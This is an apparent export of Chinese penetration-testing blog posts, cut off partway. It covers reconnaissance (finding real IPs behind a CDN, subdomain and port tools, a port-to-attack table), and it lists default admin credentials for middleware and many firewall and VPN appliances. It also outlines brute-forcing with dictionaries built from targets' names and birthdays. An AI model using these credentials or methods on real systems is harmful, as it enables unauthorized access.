电信，但是ip地址不同，则可以确定为使用了CDN，如果结果显示ip归属地在不同地址，也可以确定为使用了CDN：</p>\n<table>\n<thead>\n<tr>\n<th>监测点</th>\n<th>响应IP</th>\n<th>IP归属地</th>\n<th>响应时间</th>\n<th>TTL</th>\n<th>赞助商</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>四川绵阳[电信]</td>\n<td>220.181.38.251</td>\n<td>中国北京海淀 电信</td>\n<td>35ms</td>\n<td>53ms</td>\n<td></td>\n</tr>\n<tr>\n<td>河南洛阳[多线]</td>\n<td>220.181.38.148</td>\n<td>中国北京海淀 电信</td>\n<td>23ms</td>\n<td>52ms</td>\n<td></td>\n</tr>\n<tr>\n<td>江苏镇江[多线]</td>\n<td>220.181.38.251</td>\n<td>中国北京海淀 电信</td>\n<td>32ms</td>\n<td>49ms</td>\n<td></td>\n</tr>\n<tr>\n<td>江苏镇江[电信]</td>\n<td>220.181.38.148</td>\n<td>中国北京海淀 电信</td>\n<td>27ms</td>\n<td>50ms</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"1-2-查找真实IP\"><a href=\"#1-2-查找真实IP\" class=\"headerlink\" title=\"1.2 查找真实IP\"></a>1.2 查找真实IP</h2><blockquote>\n<p>Tips:找到真实ip，绑定host，可以打开目标网站就是真实ip</p>\n</blockquote>\n<h3 id=\"1-2-1-大数据网络搜索平台\"><a href=\"#1-2-1-大数据网络搜索平台\" class=\"headerlink\" title=\"1.2.1 大数据网络搜索平台\"></a>1.2.1 大数据网络搜索平台</h3><p><a href=\"https://zoomeye.org/\">钟馗之眼</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC.png\" alt=\"钟馗之眼\"></p>\n<p><a href=\"https://www.censys.io/\">censys</a></p>\n<p><a href=\"https://fofa.info/\">FOFA</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/fofa.png\" alt=\"FOFA\"></p>\n<p><a href=\"%5Bshodan%5D(https://www.shodan.io/)\">shodan</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/shodan.png\" alt=\"shoda\"></p>\n<h3 id=\"1-2-2-历史DNS记录\"><a href=\"#1-2-2-历史DNS记录\" class=\"headerlink\" title=\"1.2.2 历史DNS记录\"></a>1.2.2 历史DNS记录</h3><blockquote>\n<p>最早解析的ip地址为真实ip地址，(可能会存在使用CDN前的ip地址)</p>\n</blockquote>\n<p><a href=\"https://dnsdb.io/zh-cn\">全球DNS搜索引擎</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%85%A8%E7%90%83DNS%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E.png\" alt=\"全球DNS搜索引擎\"></p>\n<p><a href=\"https://x.threatbook.cn/\">情报社区</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF.png\" alt=\"情报社区\"></p>\n<p><a href=\"https://toolbar.netcraft.com/site_report?url=\">Netcraft</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Netcraft.png\" alt=\"Netcraft\"></p>\n<p><a href=\"http://viewdns.info/\">viewdnsinfo</a></p>\n<p><a href=\"https://github.com/3xp10it/xcdn\">xcdn</a></p>\n<p><a href=\"http://bobao.360.cn/learning/detail/221.html\">zmap</a></p>\n<h3 id=\"1-2-3-主动连接暴露的真实ip\"><a href=\"#1-2-3-主动连接暴露的真实ip\" class=\"headerlink\" title=\"1.2.3 主动连接暴露的真实ip\"></a>1.2.3 主动连接暴露的真实ip</h3><ul>\n<li>注册网站邮件验证(显示邮件原文，from字段为真实ip)</li>\n<li>RSS</li>\n<li>订阅网站</li>\n</ul>\n<h3 id=\"1-2-4-国外代理访问\"><a href=\"#1-2-4-国外代理访问\" class=\"headerlink\" title=\"1.2.4 国外代理访问\"></a>1.2.4 国外代理访问</h3><p>国内的CDN往往只针对国内用户访问加速，有时候通过国外的DNS解析可以得到真实IP</p>\n<h3 id=\"1-2-5-纯真ip数据库\"><a href=\"#1-2-5-纯真ip数据库\" class=\"headerlink\" title=\"1.2.5 纯真ip数据库\"></a>1.2.5 纯真ip数据库</h3><h2 id=\"1-3-IP信息收集\"><a href=\"#1-3-IP信息收集\" class=\"headerlink\" title=\"1.3 IP信息收集\"></a>1.3 IP信息收集</h2><h3 id=\"1-3-1-IP-段整理\"><a href=\"#1-3-1-IP-段整理\" class=\"headerlink\" title=\"1.3.1 IP 段整理\"></a>1.3.1 IP 段整理</h3><p><a href=\"https://ipwhois.cnnic.net.cn/\">CNNICIP</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ip%E6%AE%B5.png\" alt=\"CNNICIP\"></p>\n<h3 id=\"1-3-2-C段、旁站\"><a href=\"#1-3-2-C段、旁站\" class=\"headerlink\" title=\"1.3.2 C段、旁站\"></a>1.3.2 C段、旁站</h3><p><a href=\"http://www.webscan.cc/\">WebScan</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/WebScan.png\" alt=\"WebScan\"></p>\n<p><a href=\"https://chapangzhan.com/\">查旁站</a></p>\n<h2 id=\"1-4-搜索引擎\"><a href=\"#1-4-搜索引擎\" class=\"headerlink\" title=\"1.4 搜索引擎\"></a>1.4 搜索引擎</h2><p><a href=\"https://scholar.google.com.ph/\">google学术</a></p>\n<h1 id=\"2-域名、子域名收集\"><a href=\"#2-域名、子域名收集\" class=\"headerlink\" title=\"2 域名、子域名收集\"></a>2 域名、子域名收集</h1><h2 id=\"2-1-域名的备案号\"><a href=\"#2-1-域名的备案号\" class=\"headerlink\" title=\"2.1 域名的备案号\"></a>2.1 域名的备案号</h2><p><a href=\"icp.chinaz.com\">chinaz</a></p>\n<h2 id=\"2-2-子域名工具\"><a href=\"#2-2-子域名工具\" class=\"headerlink\" title=\"2.2 子域名工具\"></a>2.2 子域名工具</h2><ul>\n<li>子域名挖掘机Layer</li>\n<li>Sublist3r</li>\n<li>oneforall</li>\n</ul>\n<h2 id=\"2-3-在线子域名接口\"><a href=\"#2-3-在线子域名接口\" class=\"headerlink\" title=\"2.3 在线子域名接口\"></a>2.3 在线子域名接口</h2><ol>\n<li><a href=\"https://securitytrails.com/list/apex_domain\">https://securitytrails.com/list/apex_domain</a></li>\n<li><a href=\"http://ce.baidu.com/index/getRelatedSites\">http://ce.baidu.com/index/getRelatedSites</a></li>\n<li><a href=\"https://dnsdumpster.com/\">https://dnsdumpster.com/</a></li>\n<li><a href=\"https://findsubdomains.com/\">https://findsubdomains.com/</a></li>\n<li><a href=\"https://dnslytics.com/domain\">https://dnslytics.com/domain</a></li>\n</ol>\n<h2 id=\"2-4-其他泄露信息\"><a href=\"#2-4-其他泄露信息\" class=\"headerlink\" title=\"2.4 其他泄露信息\"></a>2.4 其他泄露信息</h2><ol>\n<li>crossdomain.xml文件</li>\n<li>爬虫递归爬取</li>\n<li>DNS域传送漏洞</li>\n</ol>\n<h2 id=\"2-5-SSL证书查询\"><a href=\"#2-5-SSL证书查询\" class=\"headerlink\" title=\"2.5 SSL证书查询\"></a>2.5 SSL证书查询</h2><ol>\n<li>不安全的站点，浏览器证书信息泄露</li>\n<li>dnsdumpster.com</li>\n</ol>\n<h1 id=\"3-APP收集\"><a href=\"#3-APP收集\" class=\"headerlink\" title=\"3 APP收集\"></a>3 APP收集</h1><h2 id=\"3-1-app信息收集和历史版本\"><a href=\"#3-1-app信息收集和历史版本\" class=\"headerlink\" title=\"3.1 app信息收集和历史版本\"></a>3.1 app信息收集和历史版本</h2><ul>\n<li>ios：同公司的其他产品</li>\n<li>android：酷安、碗豆荚等</li>\n</ul>\n<h2 id=\"3-2-工具\"><a href=\"#3-2-工具\" class=\"headerlink\" title=\"3.2 工具\"></a>3.2 工具</h2><blockquote>\n<p>未加密的app会扫描出大量可注入链接</p>\n</blockquote>\n<ul>\n<li>appinfoscanner</li>\n</ul>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/appinfoscanner.png\" alt=\"appinfoscanner\"></p>\n<h1 id=\"4-MAIL收集\"><a href=\"#4-MAIL收集\" class=\"headerlink\" title=\"4 MAIL收集\"></a>4 MAIL收集</h1><p><a href=\"https://hunter.io/\">email猎人在线</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%8C%8E%E4%BA%BA%E5%9C%A8%E7%BA%BF.png\" alt=\"email猎人在线\"></p>\n<p><a href=\"https://email-format.com/i/search_result/?q=\">email-format</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/email-format.png\" alt=\"email-format\"></p>\n<h1 id=\"5-WEB收集\"><a href=\"#5-WEB收集\" class=\"headerlink\" title=\"5 WEB收集\"></a>5 WEB收集</h1><p><a href=\"https://github.com/ElevenPaths/FOCA\">FOCA</a></p>\n<h1 id=\"6-指纹识别\"><a href=\"#6-指纹识别\" class=\"headerlink\" title=\"6 指纹识别\"></a>6 指纹识别</h1><h2 id=\"6-1-第三方网站\"><a href=\"#6-1-第三方网站\" class=\"headerlink\" title=\"6.1 第三方网站\"></a>6.1 第三方网站</h2><p><a href=\"www.yunsee.cn\">云悉</a></p>\n<h2 id=\"6-2-浏览器插件\"><a href=\"#6-2-浏览器插件\" class=\"headerlink\" title=\"6.2 浏览器插件\"></a>6.2 浏览器插件</h2><ul>\n<li>wappalyzer</li>\n</ul>\n<h2 id=\"6-3-其他工具\"><a href=\"#6-3-其他工具\" class=\"headerlink\" title=\"6.3 其他工具\"></a>6.3 其他工具</h2><ul>\n<li>what-web</li>\n<li>finger</li>\n</ul>\n<h1 id=\"7-端口识别\"><a href=\"#7-端口识别\" class=\"headerlink\" title=\"7 端口识别\"></a>7 端口识别</h1><h2 id=\"7-1-常见端口\"><a href=\"#7-1-常见端口\" class=\"headerlink\" title=\"7.1 常见端口\"></a>7.1 常见端口</h2><table>\n<thead>\n<tr>\n<th>端口</th>\n<th>服务</th>\n<th>总结</th>\n<th>文档</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>21</td>\n<td>FTP&#x2F;TFTP&#x2F;VSFTPD</td>\n<td>爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td>\n<td></td>\n</tr>\n<tr>\n<td>22</td>\n<td>SSH远程连接</td>\n<td>爆破&#x2F;openssh漏洞</td>\n<td></td>\n</tr>\n<tr>\n<td>23</td>\n<td>TELNET远程连接</td>\n<td>爆破&#x2F;嗅探&#x2F;弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>25</td>\n<td>SMTP邮件服务</td>\n<td>邮件伪造</td>\n<td></td>\n</tr>\n<tr>\n<td>53</td>\n<td>DNS域名解析系统</td>\n<td>域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</td>\n<td></td>\n</tr>\n<tr>\n<td>67&#x2F;68</td>\n<td>dhcp服务</td>\n<td>劫持&#x2F;欺骗</td>\n<td></td>\n</tr>\n<tr>\n<td>110</td>\n<td>pop3</td>\n<td>爆破&#x2F;嗅探</td>\n<td></td>\n</tr>\n<tr>\n<td>139</td>\n<td>samba服务</td>\n<td>爆破&#x2F;未授权访问&#x2F;远程命令执行</td>\n<td></td>\n</tr>\n<tr>\n<td>143</td>\n<td>Imap协议</td>\n<td>爆破JGSNMP协议爆破&#x2F;搜集目标内网信息</td>\n<td></td>\n</tr>\n<tr>\n<td>389</td>\n<td>Ldap目录访问协议</td>\n<td>注入&#x2F;未授权访问&#x2F;弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>445</td>\n<td>smb</td>\n<td>ms17-010端口溢出</td>\n<td></td>\n</tr>\n<tr>\n<td>512&#x2F;513&#x2F;514</td>\n<td>Linux Rexec服务</td>\n<td>爆破&#x2F;Rlogin登陆</td>\n<td></td>\n</tr>\n<tr>\n<td>873</td>\n<td>Rsyxc服务</td>\n<td>文件上传&#x2F;未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>1080</td>\n<td>socket</td>\n<td>爆破</td>\n<td></td>\n</tr>\n<tr>\n<td>1352</td>\n<td>Lotus domino邮件服务</td>\n<td>爆破&#x2F;信息泄漏</td>\n<td></td>\n</tr>\n<tr>\n<td>1433</td>\n<td>mssql</td>\n<td>爆破&#x2F;注入&#x2F;SA弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>1521</td>\n<td>oracle</td>\n<td>爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell2O49NfS服务配置不当</td>\n<td></td>\n</tr>\n<tr>\n<td>2181</td>\n<td>zookeeper服务</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>2375</td>\n<td>docker remote api</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>3306</td>\n<td>mysql</td>\n<td>爆破&#x2F;注入</td>\n<td></td>\n</tr>\n<tr>\n<td>3389</td>\n<td>Rdp远程桌面链接</td>\n<td>爆破&#x2F;shfit后门</td>\n<td></td>\n</tr>\n<tr>\n<td>4848</td>\n<td>GassFish控制台</td>\n<td>爆破&#x2F;认证绕过</td>\n<td></td>\n</tr>\n<tr>\n<td>5000</td>\n<td>sybase&#x2F;DB2数据库</td>\n<td>爆破&#x2F;注入&#x2F;提权</td>\n<td></td>\n</tr>\n<tr>\n<td>5432</td>\n<td>postgresql</td>\n<td>爆破&#x2F;注入&#x2F;缓冲区溢出</td>\n<td></td>\n</tr>\n<tr>\n<td>5632</td>\n<td>pcanywhere服务</td>\n<td>抓密码&#x2F;代码执行</td>\n<td></td>\n</tr>\n<tr>\n<td>5900</td>\n<td>vnc</td>\n<td>爆破&#x2F;认证绕过</td>\n<td></td>\n</tr>\n<tr>\n<td>6379</td>\n<td>Redis数据库</td>\n<td>未授权访问&#x2F;爆破</td>\n<td></td>\n</tr>\n<tr>\n<td>7001&#x2F;7002</td>\n<td>weblogic</td>\n<td>反序列化&#x2F;控制台弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>80&#x2F;443</td>\n<td>http&#x2F;https</td>\n<td>web应用漏洞&#x2F;心脏滴血</td>\n<td></td>\n</tr>\n<tr>\n<td>8069</td>\n<td>zabbix服务</td>\n<td>远程命令执行&#x2F;注入</td>\n<td></td>\n</tr>\n<tr>\n<td>8161</td>\n<td>activemq</td>\n<td>弱口令&#x2F;写文件</td>\n<td></td>\n</tr>\n<tr>\n<td>8080&#x2F;8089</td>\n<td>Jboss&#x2F;Tomcat&#x2F;Resin</td>\n<td>爆破&#x2F;PUT文件上传&#x2F;反序列化</td>\n<td></td>\n</tr>\n<tr>\n<td>8083&#x2F;8086</td>\n<td>influxDB</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>9000</td>\n<td>fastcgi</td>\n<td>远程命令执行</td>\n<td></td>\n</tr>\n<tr>\n<td>9090</td>\n<td>Websphere</td>\n<td>控制台爆破&#x2F;java反序列化&#x2F;弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>9200&#x2F;9300</td>\n<td>elasticsearch</td>\n<td>远程代码执行</td>\n<td></td>\n</tr>\n<tr>\n<td>11211</td>\n<td>memcached</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>27017&#x2F;27018</td>\n<td>mongodb</td>\n<td>未授权访问&#x2F;爆破</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"7-2-扫描工具\"><a href=\"#7-2-扫描工具\" class=\"headerlink\" title=\"7.2 扫描工具\"></a>7.2 扫描工具</h2><ul>\n<li>scanport</li>\n<li>nmap</li>\n<li>masscan</li>\n<li>masnmapscan</li>\n<li>zmap</li>\n<li>御剑高速TCP端口扫描工具</li>\n<li>御剑高速端口扫描工具</li>\n<li>IISPutScanner</li>\n<li>IISPutScanner增强版-DotNetScan</li>\n</ul>\n<h1 id=\"8-口令收集\"><a href=\"#8-口令收集\" class=\"headerlink\" title=\"8 口令收集\"></a>8 口令收集</h1><h2 id=\"8-1-弱口令字典的生成\"><a href=\"#8-1-弱口令字典的生成\" class=\"headerlink\" title=\"8.1 弱口令字典的生成\"></a>8.1 弱口令字典的生成</h2><ul>\n<li>针对个人信息生成针对个人的密码字典</li>\n</ul>\n<p><a href=\"https://www.bugku.com/mima/\">CTF密码生成器</a></p>\n<ul>\n<li>白鹿社工字典生成器</li>\n</ul>\n<p><a href=\"https://github.com/x311/BaiLu-SED-Tool\">白鹿社工字典生成器</a></p>\n"},{"title":"经典漏洞-弱口令","excerpt":"默认弱口令及实战思路等……","index_img":"/img/article-head/弱口令.jpeg","date":"2022-06-17T02:46:25.000Z","updated":"2022-06-23T06:46:25.000Z","hide":false,"_content":"\n- [1 默认弱口令](#1-默认弱口令)\n  - [1.1 web容器后台弱口令](#11-web容器后台弱口令)\n  - [1.2 安全设备弱口令](#12-安全设备弱口令)\n- [2 实战思路](#2-实战思路)\n  - [2.1 字典生成](#21-字典生成)\n  - [2.2 批量爆破工具](#22-批量爆破工具)\n\n# 1 默认弱口令\n\n## 1.1 web容器后台弱口令\n\n常见中间件 | 管理端口 | 后台地址 | 默认账号名密码\n| - | - | - | - |\nJboss | 8080 | http://ip:8080/web-console/</br>http://ip:8080/jmx-console/</br>http://ip:8080/console | admin/admin\nWebSphere | 9060(控制台端口)</br>9043</br>9080</br>9443</br>2809</br>5060</br>5061</br>8880</br>9401</br>9403</br>9402</br>9100</br>9353</br>7276</br>7286</br>5558</br>5578 | http://ip:9060/ibm/console/ | 默认没有鉴权页面\nWeblogic | 7001(http管理控制端口)</br>7002(https管理控制端口) | http://ip:7001/console | weblogic/weblogic1</br>weblogic/weblogic</br>system/system</br>portaladmin/portaladmin</br>guest/guest\nTomcat | 8080 | http://ip:8080/manager/html | tomcat/tomcat</br>both/tomcat</br>role1/tomcat</br>manager/admin\n\n\n## 1.2 安全设备弱口令\n\n产品 | 登录地址 | 默认账号名密码 | 技术支持热线\n| - | - | - | - |\n天融信防火墙 | https://192.168.1.254</br>https://192.168.1.254:8080 | superman/talent</br>superman/talent!23 | 8008105119\n联想网御防火墙(需要证书) | https://10.1.5.254:8889 | admin/leadsec@7766</br>admin/administrator</br>admin/bane@7766 | 4008107766</br>1056632666\n深信服防火墙 | https://10.251.251.251</br>https://10.254.254.254 | admin/admin | 4006306430\n启明星辰 | https://10.1.5.254:8889</br>https://10.50.10.45:8889 | admin/bane＠7766</br>admin/admin＠123 | 10.50.10.44/255.255.255.0</br>技术支持热线:4006243900\njuniper | https://192.168.1.1 | netscreen/netscreen | \nCisco | https://192.168.0.1 | admin/cisco | \nHuawei | http://192.168.0.1 | admin/Admin＠123 | \nH3C | http://192.168.0.1 | admin/admin | 4006306430\n绿盟IPS | https://192.168.1.101 | weboper/weboper | 配置重启生效\n网神防火墙GE1口 | https://10.50.10.45 | admin/firewall | 4006108220\n深信服VPN | 51111端口 | delanrecover | \n华为VPN |  | root/mduadmin | \n华为防火墙 |  | admin/Admin＠123</br>eudemon/eudemon | \nJuniper防火墙 |  | netscreen/netscreen | \n迪普 | 192.168.0.1 | admin／admin＿default | \n山石 | 192.168.1.1 | hillstone/hillstone | \n安恒的明御防火墙 |  | admin／adminadmin | \n某堡垒机 |  | shterm／shterm | \n天融信的vpn |  | test／123456 | \n\n\n# 2 实战思路\n\n- 授权项目\n1. ip地址\n2. 踩点获得人员姓名及生日\n\n## 2.1 字典生成\n\n- 人员姓名大小写加生日的弱口令\n- 常规弱口令\n\n## 2.2 批量爆破工具\n\n- SNETCracker\n\n\n","source":"_posts/2022-06-17.经典漏洞-弱口令.md","raw":"---\ntitle: 经典漏洞-弱口令\nexcerpt: 默认弱口令及实战思路等……\nindex_img: /img/article-head/弱口令.jpeg\ndate: \"2022/6/17 10:46:25\"\nupdated: \"2022/6/23 14:46:25\"\nhide: false\ntags:\n- Security\n- PenTest\n- 经典漏洞\ncategories:\n- Security\n- PenTest\n- 经典漏洞\n---\n\n- [1 默认弱口令](#1-默认弱口令)\n  - [1.1 web容器后台弱口令](#11-web容器后台弱口令)\n  - [1.2 安全设备弱口令](#12-安全设备弱口令)\n- [2 实战思路](#2-实战思路)\n  - [2.1 字典生成](#21-字典生成)\n  - [2.2 批量爆破工具](#22-批量爆破工具)\n\n# 1 默认弱口令\n\n## 1.1 web容器后台弱口令\n\n常见中间件 | 管理端口 | 后台地址 | 默认账号名密码\n| - | - | - | - |\nJboss | 8080 | http://ip:8080/web-console/</br>http://ip:8080/jmx-console/</br>http://ip:8080/console | admin/admin\nWebSphere | 9060(控制台端口)</br>9043</br>9080</br>9443</br>2809</br>5060</br>5061</br>8880</br>9401</br>9403</br>9402</br>9100</br>9353</br>7276</br>7286</br>5558</br>5578 | http://ip:9060/ibm/console/ | 默认没有鉴权页面\nWeblogic | 7001(http管理控制端口)</br>7002(https管理控制端口) | http://ip:7001/console | weblogic/weblogic1</br>weblogic/weblogic</br>system/system</br>portaladmin/portaladmin</br>guest/guest\nTomcat | 8080 | http://ip:8080/manager/html | tomcat/tomcat</br>both/tomcat</br>role1/tomcat</br>manager/admin\n\n\n## 1.2 安全设备弱口令\n\n产品 | 登录地址 | 默认账号名密码 | 技术支持热线\n| - | - | - | - |\n天融信防火墙 | https://192.168.1.254</br>https://192.168.1.254:8080 | superman/talent</br>superman/talent!23 | 8008105119\n联想网御防火墙(需要证书) | https://10.1.5.254:8889 | admin/leadsec@7766</br>admin/administrator</br>admin/bane@7766 | 4008107766</br>1056632666\n深信服防火墙 | https://10.251.251.251</br>https://10.254.254.254 | admin/admin | 4006306430\n启明星辰 | https://10.1.5.254:8889</br>https://10.50.10.45:8889 | admin/bane＠7766</br>admin/admin＠123 | 10.50.10.44/255.255.255.0</br>技术支持热线:4006243900\njuniper | https://192.168.1.1 | netscreen/netscreen | \nCisco | https://192.168.0.1 | admin/cisco | \nHuawei | http://192.168.0.1 | admin/Admin＠123 | \nH3C | http://192.168.0.1 | admin/admin | 4006306430\n绿盟IPS | https://192.168.1.101 | weboper/weboper | 配置重启生效\n网神防火墙GE1口 | https://10.50.10.45 | admin/firewall | 4006108220\n深信服VPN | 51111端口 | delanrecover | \n华为VPN |  | root/mduadmin | \n华为防火墙 |  | admin/Admin＠123</br>eudemon/eudemon | \nJuniper防火墙 |  | netscreen/netscreen | \n迪普 | 192.168.0.1 | admin／admin＿default | \n山石 | 192.168.1.1 | hillstone/hillstone | \n安恒的明御防火墙 |  | admin／adminadmin | \n某堡垒机 |  | shterm／shterm | \n天融信的vpn |  | test／123456 | \n\n\n# 2 实战思路\n\n- 授权项目\n1. ip地址\n2. 踩点获得人员姓名及生日\n\n## 2.1 字典生成\n\n- 人员姓名大小写加生日的弱口令\n- 常规弱口令\n\n## 2.2 批量爆破工具\n\n- SNETCracker\n\n\n","slug":"2022-06-17.经典漏洞-弱口令","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9b00006oqna6blagnwm","content":"<ul>\n<li><a href=\"#1-%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4\">1 默认弱口令</a><ul>\n<li><a href=\"#11-web%E5%AE%B9%E5%99%A8%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4\">1.1 web容器后台弱口令</a></li>\n<li><a href=\"#12-%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%BC%B1%E5%8F%A3%E4%BB%A4\">1.2 安全设备弱口令</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E5%AE%9E%E6%88%98%E6%80%9D%E8%B7%AF\">2 实战思路</a><ul>\n<li><a href=\"#21-%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90\">2.1 字典生成</a></li>\n<li><a href=\"#22-%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7\">2.2 批量爆破工具</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-默认弱口令\"><a href=\"#1-默认弱口令\" class=\"headerlink\" title=\"1 默认弱口令\"></a>1 默认弱口令</h1><h2 id=\"1-1-web容器后台弱口令\"><a href=\"#1-1-web容器后台弱口令\" class=\"headerlink\" title=\"1.1 web容器后台弱口令\"></a>1.1 web容器后台弱口令</h2><table>\n<thead>\n<tr>\n<th>常见中间件</th>\n<th>管理端口</th>\n<th>后台地址</th>\n<th>默认账号名密码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Jboss</td>\n<td>8080</td>\n<td><a href=\"http://ip:8080/web-console/\">http://ip:8080/web-console/</a></br><a href=\"http://ip:8080/jmx-console/\">http://ip:8080/jmx-console/</a></br><a href=\"http://ip:8080/console\">http://ip:8080/console</a></td>\n<td>admin&#x2F;admin</td>\n</tr>\n<tr>\n<td>WebSphere</td>\n<td>9060(控制台端口)</br>9043</br>9080</br>9443</br>2809</br>5060</br>5061</br>8880</br>9401</br>9403</br>9402</br>9100</br>9353</br>7276</br>7286</br>5558</br>5578</td>\n<td><a href=\"http://ip:9060/ibm/console/\">http://ip:9060/ibm/console/</a></td>\n<td>默认没有鉴权页面</td>\n</tr>\n<tr>\n<td>Weblogic</td>\n<td>7001(http管理控制端口)</br>7002(https管理控制端口)</td>\n<td><a href=\"http://ip:7001/console\">http://ip:7001/console</a></td>\n<td>weblogic&#x2F;weblogic1</br>weblogic&#x2F;weblogic</br>system&#x2F;system</br>portaladmin&#x2F;portaladmin</br>guest&#x2F;guest</td>\n</tr>\n<tr>\n<td>Tomcat</td>\n<td>8080</td>\n<td><a href=\"http://ip:8080/manager/html\">http://ip:8080/manager/html</a></td>\n<td>tomcat&#x2F;tomcat</br>both&#x2F;tomcat</br>role1&#x2F;tomcat</br>manager&#x2F;admin</td>\n</tr>\n</tbody></table>\n<h2 id=\"1-2-安全设备弱口令\"><a href=\"#1-2-安全设备弱口令\" class=\"headerlink\" title=\"1.2 安全设备弱口令\"></a>1.2 安全设备弱口令</h2><table>\n<thead>\n<tr>\n<th>产品</th>\n<th>登录地址</th>\n<th>默认账号名密码</th>\n<th>技术支持热线</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>天融信防火墙</td>\n<td><a href=\"https://192.168.1.254/\">https://192.168.1.254</a></br><a href=\"https://192.168.1.254:8080/\">https://192.168.1.254:8080</a></td>\n<td>superman&#x2F;talent</br>superman&#x2F;talent!23</td>\n<td>8008105119</td>\n</tr>\n<tr>\n<td>联想网御防火墙(需要证书)</td>\n<td><a href=\"https://10.1.5.254:8889/\">https://10.1.5.254:8889</a></td>\n<td>admin&#x2F;leadsec@7766</br>admin&#x2F;administrator</br>admin&#x2F;bane@7766</td>\n<td>4008107766</br>1056632666</td>\n</tr>\n<tr>\n<td>深信服防火墙</td>\n<td><a href=\"https://10.251.251.251/\">https://10.251.251.251</a></br><a href=\"https://10.254.254.254/\">https://10.254.254.254</a></td>\n<td>admin&#x2F;admin</td>\n<td>4006306430</td>\n</tr>\n<tr>\n<td>启明星辰</td>\n<td><a href=\"https://10.1.5.254:8889/\">https://10.1.5.254:8889</a></br><a href=\"https://10.50.10.45:8889/\">https://10.50.10.45:8889</a></td>\n<td>admin&#x2F;bane＠7766</br>admin&#x2F;admin＠123</td>\n<td>10.50.10.44&#x2F;255.255.255.0</br>技术支持热线:4006243900</td>\n</tr>\n<tr>\n<td>juniper</td>\n<td><a href=\"https://192.168.1.1/\">https://192.168.1.1</a></td>\n<td>netscreen&#x2F;netscreen</td>\n<td></td>\n</tr>\n<tr>\n<td>Cisco</td>\n<td><a href=\"https://192.168.0.1/\">https://192.168.0.1</a></td>\n<td>admin&#x2F;cisco</td>\n<td></td>\n</tr>\n<tr>\n<td>Huawei</td>\n<td><a href=\"http://192.168.0.1/\">http://192.168.0.1</a></td>\n<td>admin&#x2F;Admin＠123</td>\n<td></td>\n</tr>\n<tr>\n<td>H3C</td>\n<td><a href=\"http://192.168.0.1/\">http://192.168.0.1</a></td>\n<td>admin&#x2F;admin</td>\n<td>4006306430</td>\n</tr>\n<tr>\n<td>绿盟IPS</td>\n<td><a href=\"https://192.168.1.101/\">https://192.168.1.101</a></td>\n<td>weboper&#x2F;weboper</td>\n<td>配置重启生效</td>\n</tr>\n<tr>\n<td>网神防火墙GE1口</td>\n<td><a href=\"https://10.50.10.45/\">https://10.50.10.45</a></td>\n<td>admin&#x2F;firewall</td>\n<td>4006108220</td>\n</tr>\n<tr>\n<td>深信服VPN</td>\n<td>51111端口</td>\n<td>delanrecover</td>\n<td></td>\n</tr>\n<tr>\n<td>华为VPN</td>\n<td></td>\n<td>root&#x2F;mduadmin</td>\n<td></td>\n</tr>\n<tr>\n<td>华为防火墙</td>\n<td></td>\n<td>admin&#x2F;Admin＠123</br>eudemon&#x2F;eudemon</td>\n<td></td>\n</tr>\n<tr>\n<td>Juniper防火墙</td>\n<td></td>\n<td>netscreen&#x2F;netscreen</td>\n<td></td>\n</tr>\n<tr>\n<td>迪普</td>\n<td>192.168.0.1</td>\n<td>admin／admin＿default</td>\n<td></td>\n</tr>\n<tr>\n<td>山石</td>\n<td>192.168.1.1</td>\n<td>hillstone&#x2F;hillstone</td>\n<td></td>\n</tr>\n<tr>\n<td>安恒的明御防火墙</td>\n<td></td>\n<td>admin／adminadmin</td>\n<td></td>\n</tr>\n<tr>\n<td>某堡垒机</td>\n<td></td>\n<td>shterm／shterm</td>\n<td></td>\n</tr>\n<tr>\n<td>天融信的vpn</td>\n<td></td>